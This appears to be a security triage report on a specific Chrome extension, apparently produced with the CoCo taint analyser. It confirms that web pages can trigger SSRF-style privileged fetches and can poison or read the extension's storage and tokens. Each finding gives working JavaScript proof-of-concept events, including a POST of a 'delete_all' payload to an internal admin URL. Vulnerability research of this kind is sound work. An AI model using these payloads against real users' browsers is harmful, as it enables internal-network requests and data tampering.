# CoCo Analysis: akaghbppajebgbeaikhobgbifkcigami

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 18+ (chrome_storage_local_set_sink and fetch_resource_sink)

---

## Sink Group 1: DOM Event → SSRF via fetch()

**CoCo Trace:**
```
tainted detected!~~~in extension: /home/teofanescu/cwsCoCo/extensions_local/akaghbppajebgbeaikhobgbifkcigami with fetch_resource_sink
from document_eventListener_gwd_extension to fetch_resource_sink

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/akaghbppajebgbeaikhobgbifkcigami/opgen_generated_files/cs_0.js
Line 707    document.addEventListener('gwd_extension', function(e) {
Line 723    proxyRequestPost(e.detail.url, e.detail.payload, function(data) {
```

**Code:**

```javascript
// Content Script (cs_0.js) - Line 707-726
document.addEventListener('gwd_extension', function(e) {  // ← attacker can dispatch this event
  switch (e.detail.type) {
    case 'proxyRequestPost':
      proxyRequestPost(e.detail.url, e.detail.payload, function(data) {  // ← attacker-controlled URL
        dispatch('proxyRequestPost', data, e.detail.reqId)
      }, e.detail.referer)
      break;
    // ... other cases
  }
});

// Line 551-564
function proxyRequestPost(url, payload, callback, referer) {
  chrome.runtime.sendMessage({
    type: 'proxyRequestPost',
    url: url,  // ← attacker-controlled
    data: payload,
    referer: referer
  }, function(response) {
    callback(response)
  });
}

// Background Script (bg.js) - Line 1018-1046
chrome.runtime.onMessage.addListener(function(obj, sender, sendResponse) {
  switch (obj.type) {
    case 'proxyRequestPost':
      fetch(obj.url, {  // ← SINK: fetch to attacker-controlled URL
        method: 'post',
        body: obj.data,  // ← attacker-controlled payload
        headers: {
          'x-referer': obj.referer
        }
      }).then(r => r.text()).then(r => {
        try {
          let res = JSON.parse(r.replace(/u.bijiago.com/g, 'u.biyibi.com'))
          sendResponse(res)  // ← response sent back to attacker
        } catch (e) {
          sendResponse(null)
        }
      });
      break;
    // ...
  }
  return true;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener

**Attack:**

```javascript
// On any webpage where the extension runs (https://*/* or http://*/*)
document.dispatchEvent(new CustomEvent('gwd_extension', {
  detail: {
    type: 'proxyRequestPost',
    url: 'http://internal-server/admin/api',  // SSRF target
    payload: '{"action": "delete_all"}',
    reqId: '123'
  }
}));

// The extension will make a privileged fetch() request to the attacker's URL
// and send the response back via 'gwd_content' event
```

**Impact:** Server-Side Request Forgery (SSRF). Attacker can make privileged cross-origin POST requests to arbitrary URLs from the extension's context, bypassing CORS restrictions. The attacker can target internal networks, authenticated APIs, or any endpoint accessible to the user's machine. The response is sent back to the attacker.

---

## Sink Group 2: DOM Event → Complete Storage Exploitation Chain

**CoCo Trace:**
```
tainted detected!~~~in extension: /home/teofanescu/cwsCoCo/extensions_local/akaghbppajebgbeaikhobgbifkcigami with chrome_storage_local_set_sink
from document_eventListener_gwd_extension to chrome_storage_local_set_sink

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/akaghbppajebgbeaikhobgbifkcigami/opgen_generated_files/cs_0.js
Line 707    document.addEventListener('gwd_extension', function(e) {
Line 796    setStorages(e.detail.key, e.detail.value)
```

**Code:**

```javascript
// Content Script (cs_0.js) - Line 707, 795-805
document.addEventListener('gwd_extension', function(e) {  // ← attacker can dispatch this event
  switch (e.detail.type) {
    case "setStorage":
      setStorages(e.detail.key, e.detail.value)  // ← attacker-controlled key & value
      break;
    case "getStorage":
      chrome.storage.local.get(e.detail.key, function(data) {  // ← retrieve stored data
        dispatch('getStorage' + e.detail.id, data)  // ← send back to webpage
      })
      break;
    // ...
  }
});

// Line 581-585
function setStorages(k, v) {
  var obj = {}
  obj[k] = v;  // ← attacker-controlled
  chrome.storage.local.set(obj)  // ← SINK: storage poisoning
  // ...
}

// Line 500-510
function dispatch(b, c, id) {
  var evt = document.createEvent('CustomEvent')
  let payload = {
    type: b,
    value: c,  // ← stored data sent back
    id: id
  }
  evt.initCustomEvent('gwd_content', true, true, payload)
  document.dispatchEvent(evt)  // ← data flows back to attacker
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener with complete storage exploitation chain

**Attack:**

```javascript
// Step 1: Poison storage
document.dispatchEvent(new CustomEvent('gwd_extension', {
  detail: {
    type: 'setStorage',
    key: 'user_preferences',
    value: '{"malicious": "payload", "admin": true}'
  }
}));

// Step 2: Retrieve poisoned data
document.addEventListener('gwd_content', function(e) {
  if (e.detail.type.startsWith('getStorage')) {
    console.log('Retrieved poisoned data:', e.detail.value);
    // Attacker receives the stored data
  }
});

document.dispatchEvent(new CustomEvent('gwd_extension', {
  detail: {
    type: 'getStorage',
    key: 'user_preferences',
    id: 'attack1'
  }
}));
```

**Impact:** Complete storage exploitation chain. Attacker can:
1. Poison extension storage with arbitrary key-value pairs
2. Retrieve any stored data (including legitimate extension data like tokens, user preferences)
3. Exfiltrate sensitive information stored by the extension
4. Manipulate extension behavior by poisoning configuration values

---

## Sink Group 3: DOM Event → Token Storage Poisoning

**CoCo Trace:**
```
tainted detected!~~~in extension: /home/teofanescu/cwsCoCo/extensions_local/akaghbppajebgbeaikhobgbifkcigami with chrome_storage_local_set_sink
from document_eventListener_gwd_extension to chrome_storage_local_set_sink

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/akaghbppajebgbeaikhobgbifkcigami/opgen_generated_files/cs_0.js
Line 707    document.addEventListener('gwd_extension', function(e) {
Line 754-756    chrome.storage.local.set({'_PD_UTMSEO_KEY': e.detail._PD_UTMSEO_KEY, '_PD_UTMSEO_TIM': e.detail._PD_UTMSEO_TIM})
```

**Code:**

```javascript
// Content Script (cs_0.js) - Line 753-758
case "setToken":
  chrome.storage.local.set({
    '_PD_UTMSEO_KEY': e.detail._PD_UTMSEO_KEY,  // ← attacker-controlled
    '_PD_UTMSEO_TIM': e.detail._PD_UTMSEO_TIM   // ← attacker-controlled
  })
  break;
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener

**Attack:**

```javascript
// Poison token storage
document.dispatchEvent(new CustomEvent('gwd_extension', {
  detail: {
    type: 'setToken',
    _PD_UTMSEO_KEY: 'attacker_controlled_key',
    _PD_UTMSEO_TIM: 'attacker_controlled_timestamp'
  }
}));
```

**Impact:** Attacker can poison authentication/tracking tokens stored by the extension, potentially hijacking user sessions or tracking data.

---

## Additional Notes

- **Content Scripts Match:** The extension runs on `https://*/*` and `http://*/*` (all websites)
- **Permissions:** Extension has `storage` and `cookies` permissions
- **No host_permissions:** But background can still make fetch() requests with extension origin
- **Multiple Vulnerable Cases:** The DOM event listener has multiple vulnerable message handlers beyond those detailed above
